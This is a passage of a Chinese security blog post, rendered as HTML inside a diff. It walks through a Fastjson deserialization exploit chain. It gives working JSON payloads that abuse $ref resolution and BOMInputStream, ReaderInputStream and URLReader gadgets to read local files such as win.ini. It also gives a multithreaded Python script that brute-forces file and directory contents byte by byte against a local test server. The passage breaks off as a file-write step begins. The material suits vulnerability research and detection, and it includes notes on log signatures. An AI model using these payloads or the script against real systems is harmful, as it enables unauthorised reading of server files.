+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="s">&#34;$ref&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;$.a.a&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="p">},</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="s">&#34;c&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;{  \&#34;@type\&#34;: \&#34;com.fasterxml.jackson.core.JsonParser\&#34;,  \&#34;@type\&#34;: \&#34;com.fasterxml.jackson.core.json.UTF8StreamJsonParser\&#34;,  \&#34;in\&#34;: {}}&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="s">&#34;d&#34;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="s">&#34;$ref&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;$.c.c&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><p>这里解释下<code>poc构造写法</code>吧，可以看到用的是<code>&quot;a&quot;:&quot;...&quot;</code>这种而不是<code>&quot;a&quot;:{...}</code>，为什么这样构造呢（测试两种poc都是能<code>put成功</code>的），感觉是微操(就是不报错，记录日志的时候是正常的，可以看到作者的poc是200，而通常的利用是500（如果明白这个<code>特征</code>找日志就很好<code>定位</code></p>
+<p>200</p>
+<p><img loading="lazy" src="images/image-20250530110301110.png" alt="image-20250530110301110"  />
+</p>
+<p>500</p>
+<p><img loading="lazy" src="images/image-20250530110247325.png" alt="image-20250530110247325"  />
+</p>
+<h4 id="ref的利用">$ref的利用<a hidden class="anchor" aria-hidden="true" href="#ref的利用">#</a></h4>
+<blockquote>
+<p>简述：通过<code>parse.parse()</code>会还原成一个<code>map{String,String}</code>,然后<code>parser.handleResovleTask(value);</code>会去查找其中的<code>$ref</code>并进行调用，<code>$.a</code>很好理解就是获取到{&ldquo;a&rdquo;:&quot;&hellip;&ldquo;对应的<code>字符串</code>，而<code>$.a.a</code>就是利用的关键，在寻找时会判断<code>$.a</code>的<code>类型</code>，是<code>String</code>的话会进行<code>JSON.parse()</code>反序列化其值，（正常情况是得到一个map然后再在这个map中获取$.a.<code>{a}</code>{}中这个值(这里是a)。而我们这<code>JSON.parse()</code>会<code>catch</code>（这里相关处理是{}<code>跳过</code>），然后后续处理也没赋上值&ndash;&gt;最后<code>return null</code>。<code>$.a.a</code>即是<code>null</code>，</p>
+<p>so：这里$.a.a可以是<code>$.a.{任何值}</code>，只是用来触发<code>$.a的反序列化</code></p>
+</blockquote>
+<p>handleResovleTask调用$ref</p>
+<p><img loading="lazy" src="images/image-20250530110807633.png" alt="image-20250530110807633"  />
+</p>
+<p>第一次进入getPropertyValue()，查找<code>$.a</code>，当前currentObject对应整个json{&ldquo;a&rdquo;,&hellip;}(即$)</p>
+<p><img loading="lazy" src="images/image-20250530111247255.png" alt="image-20250530111247255"  />
+</p>
+<p>第二次进入getPropertyValue()，查找<code>$.a.a</code>，currentObject对应<code>$.a</code>，<code>JSON.parse()</code>触发利用</p>
+<p><img loading="lazy" src="images/image-20250530105330412.png" alt="image-20250530105330412"  />
+</p>
+<h3 id="step2文件读取">Step2：文件读取<a hidden class="anchor" aria-hidden="true" href="#step2文件读取">#</a></h3>
+<h4 id="getbom">getBom()<a hidden class="anchor" aria-hidden="true" href="#getbom">#</a></h4>
+<p>看这个之前可以先看看这篇，核心利用<code>getBom()</code></p>
+<p><a href="https://mp.weixin.qq.com/s/esjHYVm5aCJfkT6I1D0uTQ">https://mp.weixin.qq.com/s/esjHYVm5aCJfkT6I1D0uTQ</a></p>
+<blockquote>
+<p>利用需要知道<code>getBom()</code>的<code>返回值</code>，然后浅蓝这里举例了几种可能的场景感觉挺不错的</p>
+<ol>
+<li>
+<p>一处修改昵称name的功能，通过ref将<code>getBom()</code>的返回值赋予name，然后查看<code>name</code>值，判断读取内容</p>
+</li>
+<li>
+<p>同上，但是判断赋值为<code>空</code>时<code>报错</code>，不为空<code>正常</code>，布尔判断了</p>
+</li>
+<li>
+<p>没有上述这种好用的<code>name观察点</code>了，通过<code>类型错误</code>导致<code>fastjson报错</code>，根据报错判断，<code>&quot;java.lang.String&quot;{&quot;$ref&quot;:&quot;$.abc.BOM[0]&quot;}</code>，null时不报错，比对成功时返回<code>类型错误</code>报错</p>
+</li>
+<li>
+<p>没有任何报错回显时，可以在<code>类型判断</code>后面增加一个<code>dnslog</code>，报错时异常导致后面的<code>dnslog</code>请求不了（但是实战的话感觉很鸡肋）</p>
+<p>不过这种思路在<code>版本探测</code>效果还不错，就是引用几个关键版本点形成的poc进行dnslog请求（具体可以看@su18总结的</p>
+</li>
+</ol>
+</blockquote>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="s">&#34;a&#34;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="s">&#34;@type&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;java.io.InputStream&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="s">&#34;@type&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;org.apache.commons.io.input.BOMInputStream&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="s">&#34;delegate&#34;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="s">&#34;@type&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;org.apache.commons.io.input.BOMInputStream&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="s">&#34;delegate&#34;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="s">&#34;@type&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;org.apache.commons.io.input.ReaderInputStream&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="s">&#34;reader&#34;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">          </span><span class="s">&#34;@type&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;jdk.nashorn.api.scripting.URLReader&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">          </span><span class="s">&#34;url&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;file:///C:/Windows/win.ini&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">},</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="s">&#34;charsetName&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;UTF-8&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="s">&#34;bufferSize&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;1024&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="p">},</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="s">&#34;boms&#34;</span><span class="p">:</span><span class="w"> </span><span class="o">[</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">          </span><span class="s">&#34;charsetName&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;UTF-8&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">          </span><span class="s">&#34;bytes&#34;</span><span class="p">:</span><span class="w"> </span><span class="o">[</span><span class="n">59</span><span class="p">,</span><span class="n">32</span><span class="p">,</span><span class="n">102</span><span class="o">]</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="o">]</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">},</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="s">&#34;boms&#34;</span><span class="p">:</span><span class="w"> </span><span class="o">[</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="s">&#34;charsetName&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;UTF-8&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="s">&#34;bytes&#34;</span><span class="p">:</span><span class="w"> </span><span class="o">[</span><span class="n">1</span><span class="o">]</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="o">]</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="p">},</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="s">&#34;b&#34;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="s">&#34;$ref&#34;</span><span class="p">:</span><span class="s">&#34;$.a.delegate&#34;</span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><p><img loading="lazy" src="images/image-20250530180944330.png" alt="image-20250530180944330"  />
+</p>
+<p><img loading="lazy" src="images/image-20250530180922690.png" alt="image-20250530180922690"  />
+</p>
+<blockquote>
+<p>通过爆破比对位数据进行获取的</p>
+<p>在<code>parse.parse()</code>反序列化后，设置<code>Response</code>值时去获取BOM值，触发<code>getBOM()</code>，然后会和in(<code>ReaderInputStream</code>)读取到的值和原本设置的<code>boms</code>进行比对，<code>全部一致</code>则会返回其byte[]，否则返回<code>null</code></p>
+<p>这也就能通过<code>Response</code>判断文件内容了</p>
+</blockquote>
+<p><img loading="lazy" src="images/image-20250530175549725.png" alt="image-20250530175549725"  />
+</p>
+<p><img loading="lazy" src="images/image-20250530175744376.png" alt="image-20250530175744376"  />
+</p>
+<p>但是其实没必要多套一层啊，本身就能通过<code>$ref</code>触发<code>getBom()</code>，且能返回对应回显</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="s">&#34;a&#34;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="s">&#34;@type&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;java.io.InputStream&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="s">&#34;@type&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;org.apache.commons.io.input.BOMInputStream&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="s">&#34;delegate&#34;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="s">&#34;@type&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;org.apache.commons.io.input.ReaderInputStream&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="s">&#34;reader&#34;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">          </span><span class="s">&#34;@type&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;jdk.nashorn.api.scripting.URLReader&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">          </span><span class="s">&#34;url&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;file:///C:/Windows/win.ini&#34;</span><span class="c1">//${file}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">},</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="s">&#34;charsetName&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;UTF-8&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="s">&#34;bufferSize&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;1024&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="p">},</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="s">&#34;boms&#34;</span><span class="p">:</span><span class="w"> </span><span class="o">[</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">          </span><span class="s">&#34;charsetName&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;UTF-8&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">          </span><span class="s">&#34;bytes&#34;</span><span class="p">:</span><span class="w"> </span><span class="o">[</span><span class="n">59</span><span class="p">,</span><span class="n">32</span><span class="p">,</span><span class="n">102</span><span class="o">]</span><span class="c1">//${data}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="o">]</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="p">},</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="s">&#34;b&#34;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="s">&#34;$ref&#34;</span><span class="p">:</span><span class="s">&#34;$.a.BOM&#34;</span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><p><img loading="lazy" src="images/image-20250604165930698.png" alt="image-20250604165930698"  />
+</p>
+<p>因为需要爆破目录，手测有点麻烦，还是让ai写了个脚本</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">concurrent.futures</span> <span class="kn">import</span> <span class="n">ThreadPoolExecutor</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">send_request</span><span class="p">(</span><span class="n">target_url</span><span class="p">,</span> <span class="n">char_code</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">boundary</span> <span class="o">=</span> <span class="s2">&#34;----WebKitFormBoundaryROOGnnZjMDt56Gw0&#34;</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;Host&#34;</span><span class="p">:</span> <span class="s2">&#34;127.0.0.1:8080&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;User-Agent&#34;</span><span class="p">:</span> <span class="s2">&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Safari/537.36&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;Accept&#34;</span><span class="p">:</span> <span class="s2">&#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;Connection&#34;</span><span class="p">:</span> <span class="s2">&#34;close&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;Content-Type&#34;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&#34;multipart/form-data; boundary=</span><span class="si">{</span><span class="n">boundary</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">=</span> <span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="sa">f</span><span class="s1">&#39;--</span><span class="si">{</span><span class="n">boundary</span><span class="si">}</span><span class="se">\r\n</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;Content-Disposition: form-data; name=&#34;json&#34;</span><span class="se">\r\n\r\n</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;{</span><span class="se">\n</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;  &#34;a&#34;: {</span><span class="se">\n</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;    &#34;@type&#34;: &#34;java.io.InputStream&#34;,</span><span class="se">\n</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;    &#34;@type&#34;: &#34;org.apache.commons.io.input.BOMInputStream&#34;,</span><span class="se">\n</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;      &#34;delegate&#34;: {</span><span class="se">\n</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;        &#34;@type&#34;: &#34;org.apache.commons.io.input.ReaderInputStream&#34;,</span><span class="se">\n</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;        &#34;reader&#34;: {</span><span class="se">\n</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;          &#34;@type&#34;: &#34;jdk.nashorn.api.scripting.URLReader&#34;,</span><span class="se">\n</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">        <span class="sa">f</span><span class="s1">&#39;          &#34;url&#34;: &#34;</span><span class="si">{</span><span class="n">target_url</span><span class="si">}</span><span class="s1">&#34;</span><span class="se">\n</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;        },</span><span class="se">\n</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;        &#34;charsetName&#34;: &#34;UTF-8&#34;,</span><span class="se">\n</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;        &#34;bufferSize&#34;: &#34;1024&#34;</span><span class="se">\n</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;      },</span><span class="se">\n</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;      &#34;boms&#34;: [</span><span class="se">\n</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;        {</span><span class="se">\n</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;          &#34;charsetName&#34;: &#34;UTF-8&#34;,</span><span class="se">\n</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">        <span class="sa">f</span><span class="s1">&#39;          &#34;bytes&#34;: [</span><span class="si">{</span><span class="n">char_code</span><span class="si">}</span><span class="s1">]</span><span class="se">\n</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;        }</span><span class="se">\n</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;      ]</span><span class="se">\n</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;  },</span><span class="se">\n</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;  &#34;b&#34;: {&#34;$ref&#34;:&#34;$.a.BOM&#34;}</span><span class="se">\n</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;}</span><span class="se">\r\n</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">        <span class="sa">f</span><span class="s1">&#39;--</span><span class="si">{</span><span class="n">boundary</span><span class="si">}</span><span class="s1">--</span><span class="se">\r\n</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">response</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;http://127.0.0.1:8080/json&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="n">timeout</span><span class="o">=</span><span class="mi">5</span>
+</span></span><span class="line"><span class="cl">        <span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Error sending request: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">None</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">common_codes</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="mi">48</span><span class="p">,</span> <span class="mi">58</span><span class="p">))</span> <span class="o">+</span> <span class="nb">list</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="mi">65</span><span class="p">,</span> <span class="mi">91</span><span class="p">))</span> <span class="o">+</span> <span class="nb">list</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="mi">97</span><span class="p">,</span> <span class="mi">123</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">other_codes</span> <span class="o">=</span> <span class="p">[</span><span class="n">c</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">)</span> <span class="k">if</span> <span class="n">c</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">common_codes</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">ordered_codes</span> <span class="o">=</span> <span class="n">common_codes</span> <span class="o">+</span> <span class="n">other_codes</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 优先常见字符，然后测试其他字符</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">brute_force_chars</span><span class="p">(</span><span class="n">target_url</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">valid_chars</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="n">ThreadPoolExecutor</span><span class="p">(</span><span class="n">max_workers</span><span class="o">=</span><span class="mi">50</span><span class="p">)</span> <span class="k">as</span> <span class="n">executor</span><span class="p">:</span>  <span class="c1"># 可根据网络情况调整线程数</span>
+</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">futures</span> <span class="o">=</span> <span class="p">{}</span>
+</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="n">code</span> <span class="ow">in</span> <span class="n">ordered_codes</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">full_code</span> <span class="o">=</span> <span class="n">valid_chars</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">code</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="n">futures</span><span class="p">[</span><span class="n">executor</span><span class="o">.</span><span class="n">submit</span><span class="p">(</span><span class="n">send_request</span><span class="p">,</span> <span class="n">target_url</span><span class="p">,</span> <span class="n">full_code</span><span class="p">)]</span> <span class="o">=</span> <span class="n">code</span>
+</span></span><span class="line"><span class="cl">            
+</span></span><span class="line"><span class="cl">            <span class="n">found</span> <span class="o">=</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="n">future</span> <span class="ow">in</span> <span class="n">futures</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">code</span> <span class="o">=</span> <span class="n">futures</span><span class="p">[</span><span class="n">future</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">                <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">response_text</span> <span class="o">=</span> <span class="n">future</span><span class="o">.</span><span class="n">result</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">if</span> <span class="n">response_text</span> <span class="ow">and</span> <span class="s1">&#39;&#34;b&#34;:null&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">response_text</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                        <span class="n">valid_chars</span> <span class="o">+=</span> <span class="nb">str</span><span class="p">(</span><span class="n">code</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34;,&#34;</span>
+</span></span><span class="line"><span class="cl">                        <span class="nb">print</span><span class="p">(</span><span class="n">valid_chars</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                        <span class="n">found</span> <span class="o">=</span> <span class="kc">True</span>
+</span></span><span class="line"><span class="cl">                        <span class="k">break</span>
+</span></span><span class="line"><span class="cl">                <span class="k">except</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">continue</span>
+</span></span><span class="line"><span class="cl">                
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="ow">not</span> <span class="n">found</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">bytes_list</span> <span class="o">=</span> <span class="p">[</span><span class="nb">int</span><span class="p">(</span><span class="n">b</span><span class="p">)</span> <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">valid_chars</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;,&#34;</span><span class="p">)</span> <span class="k">if</span> <span class="n">b</span><span class="o">.</span><span class="n">strip</span><span class="p">()]</span>
+</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Final result:&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">b</span><span class="p">)</span> <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">bytes_list</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">                <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># if len(sys.argv) != 2:</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">#     print(&#34;Usage: python exploit.py &lt;target_url&gt;&#34;)</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">#     print(&#34;Example: python exploit.py file:///C:/Windows/win.ini&#34;)</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">#     sys.exit(1)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1"># target_url = sys.argv[1]</span>
+</span></span><span class="line"><span class="cl">      <span class="n">brute_force_chars</span><span class="p">(</span><span class="s2">&#34;file:///C:/Users&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">#   brute_force_chars(target_url)</span>
+</span></span></code></pre></div><p><img loading="lazy" src="images/image-20250630111650333.png" alt="image-20250630111650333"  />
+</p>
+<p>但是在window环境下感觉有点灾难，因为我本地环境下Temp的目录太多了，查看了翻代码希望达到<code>.../Temp/tomcat.*</code>匹配tomcat开头文件（无果）</p>
+<h3 id="step3-写入文件">Step3: 写入文件<a hidden class="anchor" aria-hidden="true" href="#step3-写入文件">#</a></h3>
+<p>这里我加了几处<code>charsetName</code>，不然我环境会报错缺少charset Name</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="p">{</span><span class="w">
